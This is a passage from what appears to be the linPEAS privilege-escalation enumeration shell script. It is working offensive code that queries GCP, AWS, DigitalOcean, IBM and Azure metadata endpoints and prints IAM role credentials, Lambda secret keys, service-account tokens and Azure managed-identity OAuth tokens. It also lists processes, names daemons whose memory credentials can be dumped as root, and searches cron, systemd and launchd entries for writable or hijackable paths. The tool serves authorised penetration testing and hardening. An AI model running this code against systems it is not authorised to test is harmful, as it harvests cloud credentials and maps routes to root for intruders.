  2228	
  2229	        echo ""
  2230	        print_3title "Service Accounts"
  2231	        for sa in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"); do 
  2232	            echo "  Name: $sa"
  2233	            echo "  Email: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/email")
  2234	            echo "  Aliases: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/aliases")
  2235	            echo "  Identity: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/identity")
  2236	            echo "  Scopes: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/scopes") | sed -${E} "s,${GCP_GOOD_SCOPES},${SED_GREEN},g" | sed -${E} "s,${GCP_BAD_SCOPES},${SED_RED},g"
  2237	            echo "  Token: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/token")
  2238	            echo "  ==============  "
  2239	        done
  2240	    fi
  2241	fi
  2242	
  2243	
  2244	if [ "$is_aws_ecs" = "Yes" ]; then
  2245	    print_2title "AWS ECS Enumeration"
  2246	    
  2247	    aws_ecs_req=""
  2248	    if [ "$(command -v curl)" ]; then
  2249	        aws_ecs_req='curl -s -f'
  2250	    elif [ "$(command -v wget)" ]; then
  2251	        aws_ecs_req='wget -q -O -'
  2252	    else 
  2253	        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2254	    fi
  2255	
  2256	    if [ "$aws_ecs_metadata_uri" ]; then
  2257	        print_3title "Container Info"
  2258	        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri"
  2259	        echo ""
  2260	        
  2261	        print_3title "Task Info"
  2262	        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri/task"
  2263	        echo ""
  2264	    else
  2265	        echo "I couldn't find ECS_CONTAINER_METADATA_URI env var to get container info"
  2266	    fi
  2267	
  2268	    if [ "$aws_ecs_service_account_uri" ]; then
  2269	        print_3title "IAM Role"
  2270	        exec_with_jq eval $aws_ecs_req "$aws_ecs_service_account_uri"
  2271	        echo ""
  2272	    else
  2273	        echo "I couldn't find AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var to get IAM role info (the task is running without a task role probably)"
  2274	    fi
  2275	fi
  2276	
  2277	if [ "$is_aws_ec2" = "Yes" ]; then
  2278	    print_2title "AWS EC2 Enumeration"
  2279	    
  2280	    HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
  2281	    URL="http://169.254.169.254/latest/meta-data"
  2282	    
  2283	    aws_req=""
  2284	    if [ "$(command -v curl)" ]; then
  2285	        aws_req="curl -s -f -H '$HEADER'"
  2286	    elif [ "$(command -v wget)" ]; then
  2287	        aws_req="wget -q -O - -H '$HEADER'"
  2288	    else 
  2289	        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2290	    fi
  2291	  
  2292	    if [ "$aws_req" ]; then
  2293	        printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
  2294	        printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
  2295	        printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
  2296	        printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
  2297	        printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
  2298	        printf "region: "; eval $aws_req "$URL/placement/region"; echo ""
  2299	
  2300	        echo ""
  2301	        print_3title "Account Info"
  2302	        exec_with_jq eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
  2303	
  2304	        echo ""
  2305	        print_3title "Network Info"
  2306	        for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
  2307	          echo "Mac: $mac"
  2308	          printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
  2309	          printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
  2310	          printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
  2311	          echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
  2312	          printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
  2313	          echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
  2314	          printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
  2315	          echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
  2316	          echo ""
  2317	        done
  2318	
  2319	        echo ""
  2320	        print_3title "IAM Role"
  2321	        exec_with_jq eval $aws_req "$URL/iam/info"; echo ""
  2322	        for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
  2323	          echo "Role: $role"
  2324	          exec_with_jq eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
  2325	          echo ""
  2326	        done
  2327	        
  2328	        echo ""
  2329	        print_3title "User Data"
  2330	        eval $aws_req "http://169.254.169.254/latest/user-data"; echo ""
  2331	        
  2332	        echo ""
  2333	        echo "EC2 Security Credentials"
  2334	        exec_with_jq eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
  2335	        
  2336	        print_3title "SSM Runnig"
  2337	        ps aux 2>/dev/null | grep "ssm-agent" | grep -v "grep" | sed "s,ssm-agent,${SED_RED},"
  2338	    fi
  2339	fi
  2340	
  2341	if [ "$is_aws_lambda" = "Yes" ]; then
  2342	  print_2title "AWS Lambda Enumeration"
  2343	  printf "Function name: "; env | grep AWS_LAMBDA_FUNCTION_NAME
  2344	  printf "Region: "; env | grep AWS_REGION
  2345	  printf "Secret Access Key: "; env | grep AWS_SECRET_ACCESS_KEY
  2346	  printf "Access Key ID: "; env | grep AWS_ACCESS_KEY_ID
  2347	  printf "Session token: "; env | grep AWS_SESSION_TOKEN
  2348	  printf "Security token: "; env | grep AWS_SECURITY_TOKEN
  2349	  printf "Runtime API: "; env | grep AWS_LAMBDA_RUNTIME_API
  2350	  printf "Event data: "; (curl -s "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next" 2>/dev/null || wget -q -O - "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next")
  2351	fi
  2352	
  2353	if [ "$is_aws_codebuild" = "Yes" ]; then
  2354	  print_2title "AWS Codebuild Enumeration"
  2355	
  2356	  aws_req=""
  2357	  if [ "$(command -v curl)" ]; then
  2358	      aws_req="curl -s -f"
  2359	  elif [ "$(command -v wget)" ]; then
  2360	      aws_req="wget -q -O -"
  2361	  else 
  2362	      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2363	      echo "The addresses are in /codebuild/output/tmp/env.sh"
  2364	  fi
  2365	
  2366	  if [ "$aws_req" ]; then
  2367	    print_3title "Credentials"
  2368	    CREDS_PATH=$(cat /codebuild/output/tmp/env.sh | grep "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | cut -d "'" -f 2)
  2369	    URL_CREDS="http://169.254.170.2$CREDS_PATH" # Already has a / at the begginig
  2370	    exec_with_jq eval $aws_req "$URL_CREDS"; echo ""
  2371	
  2372	    print_3title "Container Info"
  2373	    METADATA_URL=$(cat /codebuild/output/tmp/env.sh | grep "ECS_CONTAINER_METADATA_URI" | cut -d "'" -f 2)
  2374	    exec_with_jq eval $aws_req "$METADATA_URL"; echo ""
  2375	  fi
  2376	fi
  2377	
  2378	if [ "$is_do" = "Yes" ]; then
  2379	  print_2title "DO Droplet Enumeration"
  2380	
  2381	  do_req=""
  2382	  if [ "$(command -v curl)" ]; then
  2383	      do_req='curl -s -f '
  2384	  elif [ "$(command -v wget)" ]; then
  2385	      do_req='wget -q -O - '
  2386	  else 
  2387	      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2388	  fi
  2389	
  2390	  if [ "$do_req" ]; then
  2391	    URL="http://169.254.169.254/metadata"
  2392	    printf "Id: "; eval $do_req "$URL/v1/id"; echo ""
  2393	    printf "Region: "; eval $do_req "$URL/v1/region"; echo ""
  2394	    printf "Public keys: "; eval $do_req "$URL/v1/public-keys"; echo ""
  2395	    printf "User data: "; eval $do_req "$URL/v1/user-data"; echo ""
  2396	    printf "Dns: "; eval $do_req "$URL/v1/dns/nameservers" | tr '\n' ','; echo ""
  2397	    printf "Interfaces: "; eval $do_req "$URL/v1.json" | jq ".interfaces";
  2398	    printf "Floating_ip: "; eval $do_req "$URL/v1.json" | jq ".floating_ip";
  2399	    printf "Reserved_ip: "; eval $do_req "$URL/v1.json" | jq ".reserved_ip";
  2400	    printf "Tags: "; eval $do_req "$URL/v1.json" | jq ".tags";
  2401	    printf "Features: "; eval $do_req "$URL/v1.json" | jq ".features";
  2402	  fi
  2403	fi
  2404	
  2405	if [ "$is_ibm_vm" = "Yes" ]; then
  2406	  print_2title "IBM Cloud Enumeration"
  2407	
  2408	  if ! [ "$IBM_TOKEN" ]; then
  2409	    echo "Couldn't get the metdata token:("
  2410	
  2411	  else
  2412	    TOKEN_HEADER="Authorization: Bearer $IBM_TOKEN"
  2413	    ACCEPT_HEADER="Accept: application/json"
  2414	    URL="http://169.254.169.254/latest/meta-data"
  2415	    
  2416	    ibm_req=""
  2417	    if [ "$(command -v curl)" ]; then
  2418	        ibm_req="curl -s -f -H '$TOKEN_HEADER' -H '$ACCEPT_HEADER'"
  2419	    elif [ "$(command -v wget)" ]; then
  2420	        ibm_req="wget -q -O - -H '$TOKEN_HEADER' -H '$ACCEPT_HEADER'"
  2421	    else 
  2422	        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2423	    fi
  2424	
  2425	    if [ "$ibm_req" ]; then
  2426	      print_3title "Instance Details"
  2427	      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/instance?version=2022-03-01"
  2428	
  2429	      print_3title "Keys and User data"
  2430	      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01"
  2431	      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/keys?version=2022-03-01"
  2432	
  2433	      print_3title "Placement Groups"
  2434	      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01"
  2435	
  2436	      print_3title "IAM credentials"
  2437	      exec_with_jq eval $ibm_req -X POST "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01"
  2438	    fi
  2439	  fi
  2440	
  2441	fi
  2442	
  2443	if [ "$is_az_vm" = "Yes" ]; then
  2444	  print_2title "Azure VM Enumeration"
  2445	
  2446	  HEADER="Metadata:true"
  2447	  URL="http://169.254.169.254/metadata"
  2448	  API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions
  2449	  
  2450	  az_req=""
  2451	  if [ "$(command -v curl)" ]; then
  2452	      az_req="curl -s -f -H '$HEADER'"
  2453	  elif [ "$(command -v wget)" ]; then
  2454	      az_req="wget -q -O - -H '$HEADER'"
  2455	  else 
  2456	      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2457	  fi
  2458	
  2459	  if [ "$az_req" ]; then
  2460	    print_3title "Instance details"
  2461	    exec_with_jq eval $az_req "$URL/instance?api-version=$API_VERSION"
  2462	
  2463	    print_3title "Load Balancer details"
  2464	    exec_with_jq eval $az_req "$URL/loadbalancer?api-version=$API_VERSION"
  2465	
  2466	    print_3title "Management token"
  2467	    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://management.azure.com/"
  2468	
  2469	    print_3title "Graph token"
  2470	    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://graph.microsoft.com/"
  2471	    
  2472	    print_3title "Vault token"
  2473	    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://vault.azure.net/"
  2474	
  2475	    print_3title "Storage token"
  2476	    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://storage.azure.com/"
  2477	  fi
  2478	fi
  2479	
  2480	if [ "$check_az_app" = "Yes" ]; then
  2481	  print_2title "Azure App Service Enumeration"
  2482	  echo "I haven't tested this one, if it doesn't work, please send a PR fixing and adding functionality :)"
  2483	
  2484	  HEADER="secret:$IDENTITY_HEADER"
  2485	
  2486	  az_req=""
  2487	  if [ "$(command -v curl)" ]; then
  2488	      az_req="curl -s -f -H '$HEADER'"
  2489	  elif [ "$(command -v wget)" ]; then
  2490	      az_req="wget -q -O - -H '$HEADER'"
  2491	  else 
  2492	      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2493	  fi
  2494	
  2495	  if [ "$az_req" ]; then
  2496	    print_3title "Management token"
  2497	    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://management.azure.com/"
  2498	
  2499	    print_3title "Graph token"
  2500	    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://graph.microsoft.com/"
  2501	    
  2502	    print_3title "Vault token"
  2503	    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://vault.azure.net/"
  2504	
  2505	    print_3title "Storage token"
  2506	    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://storage.azure.com/"
  2507	  fi
  2508	fi
  2509	
  2510	fi
  2511	echo ''
  2512	echo ''
  2513	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  2514	
  2515	if echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets; then
  2516	print_title "Processes, Crons, Timers, Services and Sockets"
  2517	
  2518	####################################################
  2519	#-----) Processes & Cron & Services & Timers (-----#
  2520	####################################################
  2521	
  2522	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2523	  #-- PCS) Cleaned proccesses
  2524	  print_2title "Cleaned processes"
  2525	
  2526	  if [ "$NOUSEPS" ]; then
  2527	    printf ${BLUE}"[i]$GREEN Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
  2528	  fi
  2529	  print_info "Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes"
  2530	
  2531	  if [ -f "/etc/fstab" ] && cat /etc/fstab | grep -q "hidepid=2"; then
  2532	    echo "Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users"
  2533	  fi
  2534	
  2535	  if [ "$NOUSEPS" ]; then
  2536	    print_ps | grep -v 'sed-Es' | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
  2537	    pslist=$(print_ps)
  2538	  else
  2539	    (ps fauxwww || ps auxwww | sort ) 2>/dev/null | grep -v "\[" | grep -v "%CPU" | while read psline; do
  2540	      echo "$psline"  | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
  2541	      if [ "$(command -v capsh)" ] && ! echo "$psline" | grep -q root; then
  2542	        cpid=$(echo "$psline" | awk '{print $2}')
  2543	        caphex=0x"$(cat /proc/$cpid/status 2> /dev/null | grep CapEff | awk '{print $2}')"
  2544	        if [ "$caphex" ] && [ "$caphex" != "0x" ] && echo "$caphex" | grep -qv '0x0000000000000000'; then
  2545	          printf "  M-bM-^TM-^TM-bM-^TM-^@(${DG}Caps${NC}) "; capsh --decode=$caphex 2>/dev/null | grep -v "WARNING:" | sed -${E} "s,$capsB,${SED_RED},g"
  2546	        fi
  2547	      fi
  2548	    done
  2549	    pslist=$(ps auxwww)
  2550	    echo ""
  2551	
  2552	    #-- PCS) Binary processes permissions
  2553	    print_2title "Binary processes permissions (non 'root root' and not belonging to current user)"
  2554	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes"
  2555	    binW="IniTialiZZinnggg"
  2556	    ps auxwww 2>/dev/null | awk '{print $11}' | while read bpath; do
  2557	      if [ -w "$bpath" ]; then
  2558	        binW="$binW|$bpath"
  2559	      fi
  2560	    done
  2561	    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | grep -v " root root " | grep -v " $USER " | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
  2562	  fi
  2563	  echo ""
  2564	fi
  2565	
  2566	CURRENT_USER_PIVOT_PID=""
  2567	if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$NOUSEPS" ]; then
  2568	  #-- PCS) Process opened by other users
  2569	  print_2title "Processes whose PPID belongs to a different user (not root)"
  2570	  print_info "You will know if a user can somehow spawn processes as a different user"
  2571	  
  2572	  # Function to get user by PID
  2573	  get_user_by_pid() {
  2574	    ps -p "$1" -o user | grep -v "USER"
  2575	  }
  2576	
  2577	  # Find processes with PPID and user info, then filter those where PPID's user is different from the process's user
  2578	  ps -eo pid,ppid,user | grep -v "PPID" | while read -r pid ppid user; do
  2579	    if [ "$ppid" = "0" ]; then
  2580	      continue
  2581	    fi
  2582	    ppid_user=$(get_user_by_pid "$ppid")
  2583	    if echo "$user" | grep -Eqv "$ppid_user|root$"; then
  2584	      echo "Proc $pid with ppid $ppid is run by user $user but the ppid user is $ppid_user" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
  2585	      if [ "$ppid_user" = "$USER" ]; then
  2586	        CURRENT_USER_PIVOT_PID="$ppid"
  2587	      fi
  2588	    fi
  2589	  done
  2590	  echo ""
  2591	fi
  2592	
  2593	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2594	  #-- PCS) Files opened by processes belonging to other users
  2595	  if ! [ "$IAMROOT" ]; then
  2596	    print_2title "Files opened by processes belonging to other users"
  2597	    print_info "This is usually empty because of the lack of privileges to read other user processes information"
  2598	    lsof 2>/dev/null | grep -v "$USER" | grep -iv "permission denied" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
  2599	    echo ""
  2600	  fi
  2601	fi
  2602	
  2603	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2604	  #-- PCS) Processes with credentials inside memory
  2605	  print_2title "Processes with credentials in memory (root req)"
  2606	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory"
  2607	  if echo "$pslist" | grep -q "gdm-password"; then echo "gdm-password process found (dump creds from memory as root)" | sed "s,gdm-password process,${SED_RED},"; else echo_not_found "gdm-password"; fi
  2608	  if echo "$pslist" | grep -q "gnome-keyring-daemon"; then echo "gnome-keyring-daemon process found (dump creds from memory as root)" | sed "s,gnome-keyring-daemon,${SED_RED},"; else echo_not_found "gnome-keyring-daemon"; fi
  2609	  if echo "$pslist" | grep -q "lightdm"; then echo "lightdm process found (dump creds from memory as root)" | sed "s,lightdm,${SED_RED},"; else echo_not_found "lightdm"; fi
  2610	  if echo "$pslist" | grep -q "vsftpd"; then echo "vsftpd process found (dump creds from memory as root)" | sed "s,vsftpd,${SED_RED},"; else echo_not_found "vsftpd"; fi
  2611	  if echo "$pslist" | grep -q "apache2"; then echo "apache2 process found (dump creds from memory as root)" | sed "s,apache2,${SED_RED},"; else echo_not_found "apache2"; fi
  2612	  if echo "$pslist" | grep -q "sshd:"; then echo "sshd: process found (dump creds from memory as root)" | sed "s,sshd:,${SED_RED},"; else echo_not_found "sshd"; fi
  2613	  echo ""
  2614	fi
  2615	
  2616	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2617	  #-- PCS) Different processes 1 min
  2618	  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
  2619	    print_2title "Different processes executed during 1 min (interesting is low number of repetitions)"
  2620	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#frequent-cron-jobs"
  2621	    temp_file=$(mktemp)
  2622	    if [ "$(ps -e -o user,command 2>/dev/null)" ]; then 
  2623	      for i in $(seq 1 1210); do 
  2624	        ps -e -o user,command >> "$temp_file" 2>/dev/null; sleep 0.05; 
  2625	      done;
  2626	      sort "$temp_file" 2>/dev/null | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort -r -n | grep -E -v "\s*[1-9][0-9][0-9][0-9]" | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"; 
  2627	      rm "$temp_file";
  2628	    fi
  2629	    echo ""
  2630	  fi
  2631	fi
  2632	
  2633	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2634	  #-- PCS) Cron
  2635	  print_2title "Cron jobs"
  2636	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
  2637	  command -v crontab 2>/dev/null || echo_not_found "crontab"
  2638	  crontab -l 2>/dev/null | tr -d "\r" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
  2639	  command -v incrontab 2>/dev/null || echo_not_found "incrontab"
  2640	  incrontab -l 2>/dev/null
  2641	  ls -alR /etc/cron* /var/spool/cron/crontabs /var/spool/anacron 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g"
  2642	  cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/* /etc/incron.d/* /var/spool/incron/* 2>/dev/null | tr -d "\r" | grep -v "^#" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},"  | sed "s,root,${SED_RED},"
  2643	  crontab -l -u "$USER" 2>/dev/null | tr -d "\r"
  2644	  ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /var/at/tabs/ /etc/periodic/ 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g" #MacOS paths
  2645	  atq 2>/dev/null
  2646	else
  2647	  print_2title "Cron jobs"
  2648	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
  2649	  find "$SEARCH_IN_FOLDER" '(' -type d -or -type f ')' '(' -name "cron*" -or -name "anacron" -or -name "anacrontab" -or -name "incron.d" -or -name "incron" -or -name "at" -or -name "periodic" ')' -exec echo {} \; -exec ls -lR {} \;
  2650	fi
  2651	echo ""
  2652	
  2653	
  2654	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2655	  if [ "$MACPEAS" ]; then
  2656	    print_2title "Third party LaunchAgents & LaunchDemons"
  2657	    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#launchd"
  2658	    ls -l /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ ~/Library/LaunchDaemons/ 2>/dev/null
  2659	    echo ""
  2660	
  2661	    print_2title "Writable System LaunchAgents & LaunchDemons"
  2662	    find /System/Library/LaunchAgents/ /System/Library/LaunchDaemons/ /Library/LaunchAgents/ /Library/LaunchDaemons/ | grep ".plist" | while read f; do
  2663	      program=""
  2664	      program=$(defaults read "$f" Program 2>/dev/null)
  2665	      if ! [ "$program" ]; then
  2666	        program=$(defaults read "$f" ProgramArguments | grep -Ev "^\(|^\)" | cut -d '"' -f 2)
  2667	      fi
  2668	      if [ -w "$program" ]; then
  2669	        echo "$program" is writable | sed -${E} "s,.*,${SED_RED_YELLOW},";
  2670	      fi
  2671	    done
  2672	    echo ""
  2673	
  2674	    print_2title "StartupItems"
  2675	    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#startup-items"
  2676	    ls -l /Library/StartupItems/ /System/Library/StartupItems/ 2>/dev/null
  2677	    echo ""
  2678	
  2679	    print_2title "Login Items"
  2680	    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#login-items"
  2681	    osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null
  2682	    echo ""
  2683	
  2684	    print_2title "SPStartupItemDataType"
  2685	    system_profiler SPStartupItemDataType
  2686	    echo ""
  2687	
  2688	    print_2title "Emond scripts"
  2689	    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#emond"
  2690	    ls -l /private/var/db/emondClients
  2691	    echo ""
  2692	  fi
  2693	fi
  2694	
  2695	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2696	  #-- PCS) Services
  2697	  if [ "$EXTRA_CHECKS" ]; then
  2698	    print_2title "Services"
  2699	    print_info "Search for outdated versions"
  2700	    (service --status-all || service -e || chkconfig --list || rc-status || launchctl list) 2>/dev/null || echo_not_found "service|chkconfig|rc-status|launchctl"
  2701	    echo ""
  2702	  fi
  2703	fi
  2704	
  2705	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2706	  #-- PSC) systemd PATH
  2707	  print_2title "Systemd PATH"
  2708	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths"
  2709	  systemctl show-environment 2>/dev/null | grep "PATH" | sed -${E} "s,$Wfolders\|\./\|\.:\|:\.,${SED_RED_YELLOW},g"
  2710	  WRITABLESYSTEMDPATH=$(systemctl show-environment 2>/dev/null | grep "PATH" | grep -E "$Wfolders")
  2711	  echo ""
  2712	fi
  2713	
  2714	#-- PSC) .service files
  2715	#TODO: .service files in MACOS are folders
  2716	print_2title "Analyzing .service files"
  2717	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services"
  2718	printf "%s\n" "$PSTORAGE_SYSTEMD" | while read s; do
  2719	  if [ ! -O "$s" ] || [ "$SEARCH_IN_FOLDER" ]; then #Remove services that belongs to the current user or if firmware see everything
  2720	    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
  2721	      echo "$s" | sed -${E} "s,.*,${SED_RED_YELLOW},g"
  2722	    fi
  2723	    servicebinpaths=$(grep -Eo '^Exec.*?=[!@+-]*[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,') #Get invoked paths
  2724	    printf "%s\n" "$servicebinpaths" | while read sp; do
  2725	      if [ -w "$sp" ]; then
  2726	        echo "$s is calling this writable executable: $sp" | sed "s,writable.*,${SED_RED_YELLOW},g"
  2727	      fi
  2728	    done
  2729	    relpath1=$(grep -E '^Exec.*=(?:[^/]|-[^/]|\+[^/]|![^/]|!![^/]|)[^/@\+!-].*' "$s" 2>/dev/null | grep -Iv "=/")
  2730	    relpath2=$(grep -E '^Exec.*=.*/bin/[a-zA-Z0-9_]*sh ' "$s" 2>/dev/null)
  2731	    if [ "$relpath1" ] || [ "$relpath2" ]; then
  2732	      if [ "$WRITABLESYSTEMDPATH" ]; then
  2733	        echo "$s could be executing some relative path" | sed -${E} "s,.*,${SED_RED},";
  2734	      else
  2735	        echo "$s could be executing some relative path"
  2736	      fi
  2737	    fi
  2738	  fi
  2739	done
  2740	if [ ! "$WRITABLESYSTEMDPATH" ]; then echo "You can't write on systemd PATH" | sed -${E} "s,.*,${SED_GREEN},"; fi
  2741	echo ""
  2742	
  2743	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2744	  #-- PSC) Timers
  2745	  print_2title "System timers"
  2746	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers"
  2747	  (systemctl list-timers --all 2>/dev/null | grep -Ev "(^$|timers listed)" | sed -${E} "s,$timersG,${SED_GREEN},") || echo_not_found
  2748	  echo ""
  2749	fi
  2750	
  2751	#-- PSC) .timer files
  2752	print_2title "Analyzing .timer files"
  2753	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers"
  2754	printf "%s\n" "$PSTORAGE_TIMER" | while read t; do
  2755	  if ! [ "$IAMROOT" ] && [ -w "$t" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
